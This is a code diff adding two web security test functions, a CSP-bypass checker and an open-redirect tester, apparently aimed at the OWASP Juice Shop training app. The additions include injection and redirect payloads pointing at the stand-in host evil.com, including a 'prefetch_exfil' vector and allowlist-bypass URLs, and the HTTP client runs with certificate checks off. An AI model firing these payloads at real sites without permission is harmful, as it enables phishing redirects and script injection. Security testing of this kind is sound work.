@@ -1749,8 +1749,238 @@ async def test_web_messaging(url: str, auth_session: Optional[Dict[str, Any]] = 
         return {"status": "error", "message": str(e)}
 
 
+async def test_csp_bypass(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """Test for CSP bypass vectors that enable XSS despite Content-Security-Policy (WSTG-CLNT-15)."""
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        if auth_session:
+            if auth_session.get("token"):
+                headers["Authorization"] = f"Bearer {auth_session['token']}"
+            if auth_session.get("cookies"):
+                headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in auth_session["cookies"].items())
+
+        findings = []
+
+        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True, headers=headers) as client:
+            # 1. Fetch CSP header
+            resp = await client.get(base_url)
+            csp_header = resp.headers.get("content-security-policy", "")
+            csp_report = resp.headers.get("content-security-policy-report-only", "")
+
+            if not csp_header and not csp_report:
+                findings.append({
+                    "type": "No CSP header",
+                    "endpoint": "/",
+                    "severity": "high",
+                    "description": "No Content-Security-Policy header - XSS protection relies solely on input sanitization",
+                    "evidence": "Missing CSP header on main page"
+                })
+            else:
+                csp = csp_header or csp_report
+                is_report_only = bool(csp_report and not csp_header)
+
+                if is_report_only:
+                    findings.append({
+                        "type": "CSP report-only mode",
+                        "endpoint": "/",
+                        "severity": "medium",
+                        "description": "CSP is in report-only mode - XSS payloads still execute",
+                        "evidence": f"Content-Security-Policy-Report-Only: {csp[:200]}"
+                    })
+
+                # 2. Check for unsafe directives
+                unsafe_checks = [
+                    ("'unsafe-inline'", "script-src", "high", "unsafe-inline allows inline script execution"),
+                    ("'unsafe-eval'", "script-src", "high", "unsafe-eval allows eval() and similar"),
+                    ("data:", "script-src", "high", "data: URI in script-src allows script injection"),
+                    ("*", "script-src", "critical", "Wildcard in script-src allows any origin"),
+                    ("'unsafe-inline'", "style-src", "low", "unsafe-inline in style-src allows CSS injection"),
+                    ("data:", "img-src", "low", "data: URI in img-src allows data exfiltration"),
+                ]
+
+                for keyword, directive, severity, desc in unsafe_checks:
+                    # Parse CSP to check specific directives
+                    directive_value = ""
+                    for part in csp.split(";"):
+                        part = part.strip()
+                        if part.startswith(directive):
+                            directive_value = part
+                            break
+
+                    if keyword in directive_value:
+                        findings.append({
+                            "type": f"CSP bypass: {keyword} in {directive}",
+                            "endpoint": "/",
+                            "severity": severity,
+                            "description": desc,
+                            "evidence": f"Directive: {directive_value[:200]}"
+                        })
+
+                # 3. Check for missing directives
+                important_directives = ["default-src", "script-src", "object-src", "base-uri", "frame-ancestors"]
+                for directive in important_directives:
+                    if directive not in csp:
+                        findings.append({
+                            "type": f"Missing CSP directive: {directive}",
+                            "endpoint": "/",
+                            "severity": "medium" if directive in ("script-src", "default-src") else "low",
+                            "description": f"Missing {directive} directive - may allow {directive.replace('-src', '')} injection",
+                            "evidence": f"CSP header does not contain {directive}"
+                        })
+
+                # 4. Check for JSONP/CDN bypass opportunities
+                cdn_bypass_domains = [
+                    "cdnjs.cloudflare.com",  # Known JSONP callback
+                    "ajax.googleapis.com",    # Angular/jQuery JSONP
+                    "cdn.jsdelivr.net",
+                    "unpkg.com",
+                ]
+                for domain in cdn_bypass_domains:
+                    if domain in csp:
+                        findings.append({
+                            "type": f"CSP bypass via CDN: {domain}",
+                            "endpoint": "/",
+                            "severity": "medium",
+                            "description": f"CDN {domain} in CSP whitelist may allow JSONP/library-based XSS bypass",
+                            "evidence": f"Whitelisted CDN with known bypass techniques"
+                        })
+
+            # 5. Test XSS payloads that bypass common CSP configurations
+            csp_bypass_payloads = [
+                ("<base href='http://evil.com'>", "base_tag_injection"),
+                ("<link rel='prefetch' href='http://evil.com'>", "prefetch_exfil"),
+                ("<meta http-equiv='refresh' content='0;url=http://evil.com'>", "meta_redirect"),
+            ]
+
+            search_endpoints = ["/rest/products/search", "/#/search"]
+            for endpoint in search_endpoints:
+                for payload, bypass_type in csp_bypass_payloads:
+                    try:
+                        resp = await client.get(f"{base_url}{endpoint}", params={"q": payload})
+                        if resp.status_code == 200 and payload in resp.text:
+                            findings.append({
+                                "type": f"CSP bypass reflected: {bypass_type}",
+                                "endpoint": endpoint,
+                                "severity": "high",
+                                "description": f"CSP bypass payload reflected in response: {bypass_type}",
+                                "evidence": f"Payload: {payload[:100]}"
+                            })
+                    except Exception:
+                        continue
+
+        return {"status": "success", "data": {
+            "vulnerable": any(f.get("severity") in ("high", "critical") for f in findings),
+            "findings": findings,
+            "vulnerabilities_found": len(findings)
+        }}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
+async def test_open_redirect(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """Test for open redirect vulnerabilities including Juice Shop allowlist bypass (WSTG-CLNT-04)."""
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        if auth_session:
+            if auth_session.get("token"):
+                headers["Authorization"] = f"Bearer {auth_session['token']}"
+            if auth_session.get("cookies"):
+                headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in auth_session["cookies"].items())
+
+        findings = []
+
+        # Juice Shop allowlisted crypto redirect URLs
+        allowlisted_redirects = [
+            "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm",
+            "https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW",
+            "https://etherscan.io/address/0x0f933ab9fCAAA782D0279C300D73750e1311EAE6",
+        ]
+
+        # Generic open redirect payloads
+        generic_payloads = [
+            ("https://evil.com", "direct_external"),
+            ("//evil.com", "protocol_relative"),
+            (f"https://evil.com%23.{parsed.netloc}", "fragment_bypass"),
+            (f"https://{parsed.netloc}@evil.com", "credentials_bypass"),
+            (f"https://{parsed.netloc}.evil.com", "subdomain_bypass"),
+            ("\\evil.com", "backslash_bypass"),
+            ("/.evil.com", "dot_prefix_bypass"),
+            (f"http://evil.com%00.{parsed.netloc}", "null_byte_bypass"),
+        ]
+
+        # Allowlist bypass payloads
+        allowlist_bypass_payloads = [
+            ("https://blockchain.info.evil.com", "allowlist_subdomain_spoof"),
+            ("https://blockchain.info%23.evil.com", "allowlist_fragment_bypass"),
+            ("https://evil.com?blockchain.info", "allowlist_param_bypass"),
+        ]
+
+        all_payloads = generic_payloads + [(u, "allowlisted_crypto_redirect") for u in allowlisted_redirects] + allowlist_bypass_payloads
+
+        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=False, headers=headers) as client:
+            for payload, payload_type in all_payloads:
+                try:
+                    redirect_url = f"{base_url}/redirect?to={payload}"
+                    resp = await client.get(redirect_url)
+
+                    is_redirect = resp.status_code in (301, 302, 303, 307, 308)
+                    location = resp.headers.get("location", "")
+
+                    if is_redirect:
+                        # Check if redirected to external domain
+                        if payload_type == "allowlisted_crypto_redirect":
+                            findings.append({
+                                "type": f"Allowlisted redirect accepted: {payload_type}",
+                                "endpoint": "/redirect",
+                                "payload": payload,
+                                "severity": "medium",
+                                "description": f"Server redirects to allowlisted URL: {location}",
+                                "evidence": f"Status {resp.status_code}, Location: {location}"
+                            })
+                        elif "evil.com" in location or location.startswith("//") or location.startswith("\\"):
+                            findings.append({
+                                "type": f"Open redirect via {payload_type}",
+                                "endpoint": "/redirect",
+                                "payload": payload,
+                                "severity": "high",
+                                "description": f"Redirected to attacker-controlled domain via {payload_type}",
+                                "evidence": f"Status {resp.status_code}, Location: {location}"
+                            })
+                    else:
+                        # Check response body for meta refresh or JS redirect
+                        body = resp.text[:2000] if resp.text else ""
+                        if "evil.com" in body and ("meta http-equiv" in body.lower() or "window.location" in body.lower() or "document.location" in body.lower()):
+                            findings.append({
+                                "type": f"Client-side redirect via {payload_type}",
+                                "endpoint": "/redirect",
+                                "payload": payload,
+                                "severity": "medium",
+                                "description": f"Client-side redirect to attacker domain via {payload_type}",
+                                "evidence": body[:200]
+                            })
+                except Exception:
+                    continue
+
+        return {"status": "success", "data": {
+            "vulnerable": any(f.get("severity") in ("high", "critical") for f in findings),
+            "findings": findings,
+            "vulnerabilities_found": len(findings),
+            "payloads_tested": len(all_payloads)
+        }}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
 # ============================================================================
-# MODULE COMPLETE: 14 client-side testing tools implemented
-# Coverage: WSTG 4.11.1-4.11.15 (DOM XSS, Prototype Pollution, postMessage, CSTI, Resource Manipulation, Web Messaging)
+# MODULE COMPLETE: 15 client-side testing tools implemented
+# Coverage: WSTG 4.11.1-4.11.15 + Open Redirect (DOM XSS, Prototype Pollution, postMessage, CSTI, Resource Manipulation, Web Messaging, Open Redirect)
 # ============================================================================
 
